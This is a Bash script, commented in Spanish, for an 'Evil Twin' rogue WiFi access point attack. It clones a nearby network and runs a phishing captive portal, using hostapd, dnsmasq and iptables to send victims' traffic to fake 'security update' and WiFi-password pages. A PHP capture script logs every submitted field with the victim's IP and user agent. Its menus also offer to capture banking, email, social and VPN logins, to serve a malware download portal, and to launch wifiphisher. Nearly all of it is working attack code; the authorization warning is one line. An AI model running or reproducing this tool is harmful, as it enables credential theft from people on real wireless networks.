#!/bin/bash

# 👤 EVIL TWIN / ROGUE AP ULTIMATE
# AP falso, Captive portal, WiFiPhisher y ataques de ingeniería social

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
INTERFACE=""
INTERNET_INTERFACE=""
TARGET_BSSID=""
TARGET_ESSID=""
FAKE_AP_NAME=""
ATTACK_TYPE=""
OUTPUT_DIR=""
PORTAL_TEMPLATE=""

print_banner() {
    clear
    echo -e "${RED}"
    echo "███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗"
    echo "██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝"
    echo "█████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  "
    echo "██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  "
    echo "███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗"
    echo "╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}👤 Evil Twin Ultimate - AP Falso y Captive Portal Avanzado${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización${NC}"
    echo ""
}

check_interfaces() {
    echo -e "${YELLOW}🔍 Verificando interfaces de red...${NC}"
    
    # Detectar interfaces WiFi
    local wifi_interfaces=($(iwconfig 2>/dev/null | grep -E "^[a-z].*IEEE 802.11" | cut -d' ' -f1))
    
    if [[ ${#wifi_interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No se detectaron interfaces WiFi${NC}"
        return 1
    fi
    
    echo -e "${CYAN}📡 Interfaces WiFi disponibles:${NC}"
    for i in "${!wifi_interfaces[@]}"; do
        local iface="${wifi_interfaces[$i]}"
        local mode=$(iwconfig "$iface" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
        echo -e "  ${CYAN}$((i+1)).${NC} $iface (Modo: $mode)"
    done
    
    read -p "🎯 Selecciona interface WiFi para AP falso (1-${#wifi_interfaces[@]}): " iface_choice
    
    if [[ "$iface_choice" -ge 1 && "$iface_choice" -le ${#wifi_interfaces[@]} ]]; then
        INTERFACE="${wifi_interfaces[$((iface_choice-1))]}"
    else
        INTERFACE="${wifi_interfaces[0]}"
    fi
    
    echo -e "${GREEN}✅ Interface WiFi: $INTERFACE${NC}"
    
    # Detectar interfaces de internet
    echo -e "\n${CYAN}🌐 Interfaces con internet:${NC}"
    local inet_interfaces=($(ip route get 8.8.8.8 2>/dev/null | awk '{print $5; exit}'))
    inet_interfaces+=($(ip link show | grep -E "^[0-9]+: [a-z]" | grep -v "lo:" | cut -d':' -f2 | cut -d'@' -f1 | sed 's/ //g'))
    
    # Remover duplicados
    local unique_inet=($(printf '%s\n' "${inet_interfaces[@]}" | sort -u))
    
    for i in "${!unique_inet[@]}"; do
        local iface="${unique_inet[$i]}"
        [[ "$iface" == "$INTERFACE" ]] && continue
        local status=$(ip link show "$iface" 2>/dev/null | grep -o "state [A-Z]*" | cut -d' ' -f2)
        echo -e "  ${CYAN}$((i+1)).${NC} $iface (Estado: $status)"
    done
    
    read -p "🌐 Selecciona interface de internet (1-${#unique_inet[@]}): " inet_choice
    
    if [[ "$inet_choice" -ge 1 && "$inet_choice" -le ${#unique_inet[@]} ]]; then
        INTERNET_INTERFACE="${unique_inet[$((inet_choice-1))]}"
    else
        INTERNET_INTERFACE="${unique_inet[0]}"
    fi
    
    echo -e "${GREEN}✅ Interface internet: $INTERNET_INTERFACE${NC}"
    
    # Configurar modo monitor si es necesario
    setup_monitor_mode
}

setup_monitor_mode() {
    local current_mode=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
    
    if [[ "$current_mode" != "Managed" && "$current_mode" != "Monitor" ]]; then
        echo -e "${YELLOW}⚠️ Configurando interface WiFi...${NC}"
        
        # Detener procesos que puedan interferir
        sudo airmon-ng check kill >/dev/null 2>&1
        
        # Poner en modo managed para hostapd
        sudo ifconfig "$INTERFACE" down 2>/dev/null
        sudo iwconfig "$INTERFACE" mode managed 2>/dev/null
        sudo ifconfig "$INTERFACE" up 2>/dev/null
        
        echo -e "${GREEN}✅ Interface configurada para AP mode${NC}"
    fi
}

scan_target_networks() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}ESCANEO DE REDES OBJETIVO${NC}       ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    # Crear interface temporal para escaneo
    local temp_interface="${INTERFACE}_temp"
    sudo iw dev "$INTERFACE" interface add "$temp_interface" type monitor 2>/dev/null || true
    sudo ifconfig "$temp_interface" up 2>/dev/null
    
    local scan_file="/tmp/eviltwin_scan_$(date +%H%M%S)"
    
    echo -e "${CYAN}📡 Escaneando redes para clonar...${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 20 segundos${NC}"
    
    # Escanear con airodump-ng si la interface temporal existe
    if iwconfig "$temp_interface" >/dev/null 2>&1; then
        timeout 20 sudo airodump-ng "$temp_interface" --write "$scan_file" --output-format csv 2>/dev/null || true
        # Eliminar interface temporal
        sudo iw dev "$temp_interface" del 2>/dev/null || true
    else
        # Usar interface principal temporalmente
        timeout 20 sudo airodump-ng "$INTERFACE" --write "$scan_file" --output-format csv 2>/dev/null || true
    fi
    
    if [[ ! -f "$scan_file-01.csv" ]]; then
        echo -e "${RED}❌ No se generó archivo de scan${NC}"
        return 1
    fi
    
    # Procesar resultados
    echo -e "\n${GREEN}🎯 Redes encontradas para clonar:${NC}"
    echo -e "${BLUE}ID  BSSID             ESSID                    CH  PWR  ENC  CLIENTS${NC}"
    echo -e "${BLUE}──  ─────────────────  ───────────────────────  ──  ───  ───  ───────${NC}"
    
    local counter=1
    declare -A networks_map
    
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key_type; do
        # Filtrar líneas válidas
        if [[ -n "$bssid" && "$bssid" != "BSSID" && "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && -n "$essid" ]]; then
            # Contar clientes (estimación)
            local clients=$(grep "$bssid" "$scan_file-01.csv" | wc -l)
            [[ $clients -gt 1 ]] && clients=$((clients - 1)) || clients=0
            
            printf "${CYAN}%2d${NC}  %-17s  %-23s  %2s  %3s  %3s  %7s\n" "$counter" "$bssid" "$essid" "$channel" "$power" "$privacy" "$clients"
            networks_map["$counter"]="$bssid|$essid|$channel|$privacy"
            ((counter++))
        fi
    done < "$scan_file-01.csv"
    
    if [[ $counter -eq 1 ]]; then
        echo -e "${YELLOW}⚠️ No se encontraron redes${NC}"
        return 1
    fi
    
    echo ""
    echo -e "${YELLOW}Opciones:${NC}"
    echo -e "  ${CYAN}0.${NC} Crear AP con nombre personalizado"
    echo -e "  ${CYAN}1-$((counter-1)).${NC} Clonar red específica"
    echo ""
    
    read -p "🎯 Selecciona opción: " network_choice
    
    if [[ "$network_choice" == "0" ]]; then
        read -p "📝 Nombre del AP falso: " FAKE_AP_NAME
        TARGET_BSSID=""
        TARGET_ESSID="$FAKE_AP_NAME"
    elif [[ -n "${networks_map[$network_choice]}" ]]; then
        local network_info="${networks_map[$network_choice]}"
        TARGET_BSSID=$(echo "$network_info" | cut -d'|' -f1)
        TARGET_ESSID=$(echo "$network_info" | cut -d'|' -f2)
        FAKE_AP_NAME="$TARGET_ESSID"
        
        echo -e "${GREEN}✅ Clonando red:${NC}"
        echo -e "  📡 BSSID original: ${CYAN}$TARGET_BSSID${NC}"
        echo -e "  📝 ESSID: ${CYAN}$TARGET_ESSID${NC}"
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        return 1
    fi
    
    rm -f "$scan_file"*
}

select_attack_type() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}       ${YELLOW}TIPO DE ATAQUE EVIL TWIN${NC}        ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué tipo de ataque quieres ejecutar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🏠 AP falso simple ${PURPLE}[hostapd]${NC}"
    echo -e "  ${CYAN}2.${NC} 🕳️ Captive portal básico ${PURPLE}[hostapd + dnsmasq]${NC}"
    echo -e "  ${CYAN}3.${NC} 🎣 WiFiPhisher automático ${PURPLE}[wifiphisher]${NC}"
    echo -e "  ${CYAN}4.${NC} 🔑 Portal de captura de credenciales ${PURPLE}[personalizado]${NC}"
    echo -e "  ${CYAN}5.${NC} 📱 Portal de descarga de malware"
    echo -e "  ${CYAN}6.${NC} ⚙️ Configuración avanzada personalizada"
    echo ""
    
    read -p "Selecciona ataque (1-6): " attack_choice
    
    case $attack_choice in
        1)
            ATTACK_TYPE="simple_ap"
            echo -e "${GREEN}✅ AP falso simple${NC}"
            ;;
        2)
            ATTACK_TYPE="captive_portal"
            echo -e "${GREEN}✅ Captive portal básico${NC}"
            select_portal_template
            ;;
        3)
            ATTACK_TYPE="wifiphisher"
            echo -e "${GREEN}✅ WiFiPhisher automático${NC}"
            ;;
        4)
            ATTACK_TYPE="credential_portal"
            echo -e "${GREEN}✅ Portal de captura de credenciales${NC}"
            select_credential_template
            ;;
        5)
            ATTACK_TYPE="malware_portal"
            echo -e "${GREEN}✅ Portal de descarga de malware${NC}"
            ;;
        6)
            select_custom_config
            ;;
        *)
            echo -e "${YELLOW}Usando AP falso simple por defecto${NC}"
            ATTACK_TYPE="simple_ap"
            ;;
    esac
}

select_portal_template() {
    echo -e "\n${CYAN}🎨 Selecciona plantilla del portal:${NC}"
    echo -e "  ${CYAN}1.${NC} Router WiFi genérico"
    echo -e "  ${CYAN}2.${NC} Actualización de firmware"
    echo -e "  ${CYAN}3.${NC} Portal de hotel"
    echo -e "  ${CYAN}4.${NC} Registro de invitado"
    echo -e "  ${CYAN}5.${NC} Términos y condiciones"
    echo ""
    
    read -p "Plantilla (1-5): " template_choice
    
    case $template_choice in
        1) PORTAL_TEMPLATE="router_generic" ;;
        2) PORTAL_TEMPLATE="firmware_update" ;;
        3) PORTAL_TEMPLATE="hotel_portal" ;;
        4) PORTAL_TEMPLATE="guest_registration" ;;
        5) PORTAL_TEMPLATE="terms_conditions" ;;
        *) PORTAL_TEMPLATE="router_generic" ;;
    esac
    
    echo -e "${GREEN}✅ Plantilla seleccionada: $PORTAL_TEMPLATE${NC}"
}

select_credential_template() {
    echo -e "\n${CYAN}🔑 Selecciona tipo de credenciales a capturar:${NC}"
    echo -e "  ${CYAN}1.${NC} WiFi password"
    echo -e "  ${CYAN}2.${NC} Email credentials"
    echo -e "  ${CYAN}3.${NC} Social media login"
    echo -e "  ${CYAN}4.${NC} Banking/financial"
    echo -e "  ${CYAN}5.${NC} Corporate VPN"
    echo ""
    
    read -p "Tipo de credenciales (1-5): " cred_choice
    
    case $cred_choice in
        1) PORTAL_TEMPLATE="wifi_password" ;;
        2) PORTAL_TEMPLATE="email_login" ;;
        3) PORTAL_TEMPLATE="social_login" ;;
        4) PORTAL_TEMPLATE="banking_login" ;;
        5) PORTAL_TEMPLATE="vpn_login" ;;
        *) PORTAL_TEMPLATE="wifi_password" ;;
    esac
    
    echo -e "${GREEN}✅ Tipo de credenciales: $PORTAL_TEMPLATE${NC}"
}

select_custom_config() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}      ${YELLOW}CONFIGURACIÓN PERSONALIZADA${NC}      ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    # Configuración del AP
    echo -e "${YELLOW}Configuración del Access Point:${NC}"
    read -p "📻 Canal WiFi (1-11, default 6): " wifi_channel
    wifi_channel=${wifi_channel:-6}
    
    read -p "🔐 Tipo de encriptación (open/wep/wpa, default open): " encryption
    encryption=${encryption:-open}
    
    if [[ "$encryption" != "open" ]]; then
        read -p "🔑 Password del AP: " ap_password
    fi
    
    # Configuración de red
    echo -e "\n${YELLOW}Configuración de red:${NC}"
    read -p "🌐 IP del AP (default 192.168.1.1): " ap_ip
    ap_ip=${ap_ip:-192.168.1.1}
    
    read -p "🌐 Rango DHCP (default 192.168.1.100-200): " dhcp_range
    dhcp_range=${dhcp_range:-192.168.1.100,192.168.1.200}
    
    # Configuración del portal
    echo -e "\n${YELLOW}Configuración del portal:${NC}"
    read -p "🎨 Template personalizado? (y/N): " custom_template
    if [[ "$custom_template" == [yY]* ]]; then
        read -p "📁 Ruta del template HTML: " template_path
    fi
    
    read -p "📊 Logging avanzado? (Y/n): " advanced_logging
    advanced_logging=${advanced_logging:-y}
    
    ATTACK_TYPE="custom"
    
    # Guardar configuración
    cat > "/tmp/eviltwin_custom_config" << EOF
WIFI_CHANNEL=$wifi_channel
ENCRYPTION=$encryption
AP_PASSWORD=$ap_password
AP_IP=$ap_ip
DHCP_RANGE=$dhcp_range
CUSTOM_TEMPLATE=$custom_template
TEMPLATE_PATH=$template_path
ADVANCED_LOGGING=$advanced_logging
EOF
    
    echo -e "${GREEN}✅ Configuración personalizada guardada${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="eviltwin_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{logs,captures,portal,credentials,configs}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# Evil Twin Attack Info - $(date)
WiFi Interface: $INTERFACE
Internet Interface: $INTERNET_INTERFACE
Target BSSID: $TARGET_BSSID
Target ESSID: $TARGET_ESSID
Fake AP Name: $FAKE_AP_NAME
Attack Type: $ATTACK_TYPE
Portal Template: $PORTAL_TEMPLATE
Started: $(date)
EOF
}

create_hostapd_config() {
    local config_file="$OUTPUT_DIR/configs/hostapd.conf"
    local channel=6
    local encryption="open"
    
    # Usar configuración personalizada si existe
    if [[ -f "/tmp/eviltwin_custom_config" ]]; then
        source "/tmp/eviltwin_custom_config"
        channel=$WIFI_CHANNEL
        encryption=$ENCRYPTION
    fi
    
    cat > "$config_file" << EOF
# Hostapd configuration for Evil Twin
interface=$INTERFACE
driver=nl80211
ssid=$FAKE_AP_NAME
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
EOF
    
    # Agregar configuración de encriptación si no es abierto
    if [[ "$encryption" != "open" ]]; then
        cat >> "$config_file" << EOF
auth_algs=1
wpa=2
wpa_passphrase=${AP_PASSWORD:-password123}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    fi
    
    echo -e "${GREEN}✅ Configuración hostapd creada${NC}"
    echo "$config_file"
}

create_dnsmasq_config() {
    local config_file="$OUTPUT_DIR/configs/dnsmasq.conf"
    local ap_ip="192.168.1.1"
    local dhcp_range="192.168.1.100,192.168.1.200"
    
    # Usar configuración personalizada si existe
    if [[ -f "/tmp/eviltwin_custom_config" ]]; then
        source "/tmp/eviltwin_custom_config"
        ap_ip=$AP_IP
        dhcp_range=$DHCP_RANGE
    fi
    
    cat > "$config_file" << EOF
# DNSMasq configuration for Evil Twin
interface=$INTERFACE
dhcp-range=$dhcp_range,255.255.255.0,12h
dhcp-option=3,$ap_ip
dhcp-option=6,$ap_ip
server=8.8.8.8
log-queries
log-dhcp
address=/#/$ap_ip
EOF
    
    echo -e "${GREEN}✅ Configuración dnsmasq creada${NC}"
    echo "$config_file"
}

create_portal_template() {
    local template_type="${PORTAL_TEMPLATE:-router_generic}"
    local portal_dir="$OUTPUT_DIR/portal"
    local index_file="$portal_dir/index.html"
    
    case $template_type in
        "router_generic")
            create_router_portal "$index_file"
            ;;
        "firmware_update")
            create_firmware_portal "$index_file"
            ;;
        "wifi_password")
            create_wifi_password_portal "$index_file"
            ;;
        "email_login")
            create_email_portal "$index_file"
            ;;
        *)
            create_router_portal "$index_file"
            ;;
    esac
    
    # Crear archivo de captura de credenciales
    create_capture_script
    
    echo -e "${GREEN}✅ Portal web creado${NC}"
}

create_router_portal() {
    local file="$1"
    
    cat > "$file" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Router Configuration</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 24px; font-weight: bold; color: #2196F3; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .btn { background: #2196F3; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        .btn:hover { background: #1976D2; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🌐 Router Configuration</div>
        </div>
        
        <div class="warning">
            ⚠️ <strong>Security Update Required</strong><br>
            Your router's security settings need to be updated. Please provide your WiFi credentials to continue.
        </div>
        
        <form action="capture.php" method="POST">
            <div class="form-group">
                <label>Network Name (SSID):</label>
                <input type="text" name="ssid" value="" placeholder="Enter WiFi network name" required>
            </div>
            
            <div class="form-group">
                <label>WiFi Password:</label>
                <input type="password" name="password" placeholder="Enter WiFi password" required>
            </div>
            
            <button type="submit" class="btn">Update Security Settings</button>
        </form>
    </div>
</body>
</html>
EOF
}

create_wifi_password_portal() {
    local file="$1"
    
    cat > "$file" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WiFi Authentication Required</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 28px; margin-bottom: 10px; }
        .subtitle { color: #666; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
        input[type="password"] { width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        input[type="password"]:focus { border-color: #667eea; outline: none; }
        .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
        .btn:hover { opacity: 0.9; }
        .info { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 15px; margin-bottom: 20px; border-radius: 0 5px 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🔐</div>
            <div class="subtitle">WiFi Network Authentication</div>
        </div>
        
        <div class="info">
            <strong>Network:</strong> NETWORK_NAME_PLACEHOLDER<br>
            Please enter the WiFi password to continue.
        </div>
        
        <form action="capture.php" method="POST">
            <div class="form-group">
                <label>WiFi Password:</label>
                <input type="password" name="wifi_password" placeholder="Enter WiFi password" required autofocus>
            </div>
            
            <button type="submit" class="btn">Connect to Network</button>
        </form>
    </div>
</body>
</html>
EOF
    
    # Reemplazar placeholder con el nombre real de la red
    sed -i "s/NETWORK_NAME_PLACEHOLDER/$FAKE_AP_NAME/g" "$file"
}

create_capture_script() {
    local capture_file="$OUTPUT_DIR/portal/capture.php"
    
    cat > "$capture_file" << 'EOF'
<?php
$log_file = "../credentials/captured_data.txt";
$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Capturar todos los datos POST
$data = [];
foreach($_POST as $key => $value) {
    $data[] = "$key: $value";
}

$log_entry = "[$timestamp] IP: $ip\n";
$log_entry .= "User-Agent: $user_agent\n";
$log_entry .= "Data: " . implode(", ", $data) . "\n";
$log_entry .= "---\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirigir a página de éxito
header("Location: success.html");
exit;
?>
EOF
    
    # Crear página de éxito
    cat > "$OUTPUT_DIR/portal/success.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Connection Successful</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; text-align: center; padding: 50px; }
        .success { background: white; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .icon { font-size: 48px; color: #4CAF50; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="success">
        <div class="icon">✅</div>
        <h1>Connection Successful!</h1>
        <p>You are now connected to the internet.</p>
        <p><em>You may close this window.</em></p>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}✅ Script de captura creado${NC}"
}

execute_simple_ap() {
    echo -e "\n${YELLOW}🏠 Creando AP falso simple...${NC}"
    
    local hostapd_config=$(create_hostapd_config)
    
    echo -e "${CYAN}📡 Configurando interface...${NC}"
    sudo ifconfig "$INTERFACE" up
    
    echo -e "${CYAN}🚀 Iniciando hostapd...${NC}"
    echo -e "${YELLOW}⏳ AP falso '$FAKE_AP_NAME' ejecutándose (Ctrl+C para detener)${NC}"
    
    # Ejecutar hostapd
    sudo hostapd "$hostapd_config" 2>&1 | tee "$OUTPUT_DIR/logs/hostapd.log" || true
    
    echo -e "${GREEN}✅ AP falso detenido${NC}"
}

execute_captive_portal() {
    echo -e "\n${YELLOW}🕳️ Configurando captive portal...${NC}"
    
    local hostapd_config=$(create_hostapd_config)
    local dnsmasq_config=$(create_dnsmasq_config)
    local ap_ip="192.168.1.1"
    
    # Usar IP personalizada si existe
    if [[ -f "/tmp/eviltwin_custom_config" ]]; then
        source "/tmp/eviltwin_custom_config"
        ap_ip=$AP_IP
    fi
    
    # Crear portal web
    create_portal_template
    
    echo -e "${CYAN}🌐 Configurando red...${NC}"
    sudo ifconfig "$INTERFACE" "$ap_ip" netmask 255.255.255.0
    
    # Configurar iptables para redirección
    setup_iptables_redirect "$ap_ip"
    
    echo -e "${CYAN}🌍 Configurando compartir internet...${NC}"
    setup_internet_sharing
    
    echo -e "${CYAN}🌐 Iniciando servidor web...${NC}"
    start_web_server &
    local web_pid=$!
    
    echo -e "${CYAN}📡 Iniciando DNS/DHCP...${NC}"
    sudo dnsmasq -C "$dnsmasq_config" --log-facility="$OUTPUT_DIR/logs/dnsmasq.log" &
    local dnsmasq_pid=$!
    
    echo -e "${CYAN}📻 Iniciando AP...${NC}"
    sudo hostapd "$hostapd_config" &
    local hostapd_pid=$!
    
    echo -e "${GREEN}🎯 Captive portal activo en: http://$ap_ip${NC}"
    echo -e "${YELLOW}📊 Monitoreando conexiones (Ctrl+C para detener)...${NC}"
    
    # Monitorear credenciales
    monitor_captured_credentials &
    local monitor_pid=$!
    
    # Esperar interrupción
    trap "cleanup_processes $web_pid $dnsmasq_pid $hostapd_pid $monitor_pid" INT
    wait
}

setup_iptables_redirect() {
    local ap_ip="$1"
    
    echo -e "${CYAN}🔧 Configurando iptables...${NC}"
    
    # Limpiar reglas existentes
    sudo iptables -F
    sudo iptables -t nat -F
    
    # Redireccionar todo el tráfico HTTP al portal
    sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j DNAT --to-destination "$ap_ip:8080"
    sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j DNAT --to-destination "$ap_ip:8080"
    
    # Permitir tráfico del portal
    sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
    sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
    sudo iptables -A INPUT -p udp --dport 67 -j ACCEPT
}

setup_internet_sharing() {
    echo -e "${CYAN}🌍 Habilitando compartir internet...${NC}"
    
    # Habilitar IP forwarding
    echo '1' | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
    
    # Configurar NAT
    sudo iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
    sudo iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
}

start_web_server() {
    cd "$OUTPUT_DIR/portal"
    
    # Iniciar servidor Python simple
    if command -v python3 &> /dev/null; then
        python3 -m http.server 8080 >/dev/null 2>&1
    else
        python -m SimpleHTTPServer 8080 >/dev/null 2>&1
    fi
}

monitor_captured_credentials() {
    local creds_file="$OUTPUT_DIR/credentials/captured_data.txt"
    
    while true; do
        if [[ -f "$creds_file" ]]; then
            # Mostrar nuevas credenciales
            local new_entries=$(tail -n 20 "$creds_file" 2>/dev/null)
            if [[ -n "$new_entries" ]]; then
                echo -e "\n${GREEN}🎣 NUEVAS CREDENCIALES CAPTURADAS:${NC}"
                echo "$new_entries"
                echo ""
            fi
        fi
        sleep 10
    done
}

execute_wifiphisher() {
    echo -e "\n${YELLOW}🎣 Ejecutando WiFiPhisher...${NC}"
    
    if ! command -v wifiphisher &> /dev/null; then
        echo -e "${RED}❌ WiFiPhisher no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install wifiphisher${NC}"
        return 1
    fi
    
    echo -e "${CYAN}🚀 Iniciando WiFiPhisher automático...${NC}"
    
    local wifiphisher_cmd="wifiphisher"
    
    # Agregar interface si está especificada
    if [[ -n "$INTERFACE" ]]; then
        wifiphisher_cmd="$wifiphisher_cmd -aI $INTERFACE"
    fi
    
    if [[ -n "$INTERNET_INTERFACE" ]]; then
        wifiphisher_cmd="$wifiphisher_cmd -jI $INTERNET_INTERFACE"
    fi
    
    # Agregar red objetivo si existe
    if [[ -n "$TARGET_ESSID" ]]; then
        wifiphisher_cmd="$wifiphisher_cmd -e '$TARGET_ESSID'"
    fi
    
    echo -e "${BLUE}Comando: sudo $wifiphisher_cmd${NC}"
    echo -e "${YELLOW}⏳ WiFiPhisher ejecutándose (sigue las instrucciones en pantalla)${NC}"
    
    # Ejecutar wifiphisher
    sudo $wifiphisher_cmd 2>&1 | tee "$OUTPUT_DIR/logs/wifiphisher.log"
    
    echo -e "${GREEN}✅ WiFiPhisher completado${NC}"
}

cleanup_processes() {
    echo -e "\n${YELLOW}🧹 Limpiando procesos...${NC}"
    
    # Matar procesos
    for pid in "$@"; do
        if [[ -n "$pid" ]]; then
            sudo kill "$pid" 2>/dev/null || true
        fi
    done
    
    # Limpiar hostapd y dnsmasq
    sudo pkill hostapd 2>/dev/null || true
    sudo pkill dnsmasq 2>/dev/null || true
    
    # Restaurar iptables
    sudo iptables -F
    sudo iptables -t nat -F
    
    # Deshabilitar IP forwarding
    echo '0' | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
    
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

show_attack_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                        ${YELLOW}RESUMEN DEL ATAQUE${NC}                             ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$FAKE_AP_NAME" ]]; then
        echo -e "\n${GREEN}🎯 Evil Twin ejecutado:${NC}"
        echo -e "  📡 Nombre del AP: $FAKE_AP_NAME"
        echo -e "  🔧 Tipo de ataque: $ATTACK_TYPE"
        [[ -n "$TARGET_BSSID" ]] && echo -e "  📍 BSSID original: $TARGET_BSSID"
    fi
    
    # Verificar credenciales capturadas
    local creds_file="$OUTPUT_DIR/credentials/captured_data.txt"
    if [[ -f "$creds_file" && -s "$creds_file" ]]; then
        local cred_count=$(grep -c "^\[" "$creds_file" 2>/dev/null || echo "0")
        echo -e "\n${GREEN}🎣 ¡CREDENCIALES CAPTURADAS!${NC}"
        echo -e "  📊 Entradas registradas: ${CYAN}$cred_count${NC}"
        echo -e "  📄 Archivo: ${CYAN}$creds_file${NC}"
        
        echo -e "\n${YELLOW}📋 Últimas capturas:${NC}"
        tail -10 "$creds_file" 2>/dev/null || echo "Sin datos"
    else
        echo -e "\n${YELLOW}📭 No se capturaron credenciales${NC}"
    fi
    
    echo -e "\n${CYAN}📊 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
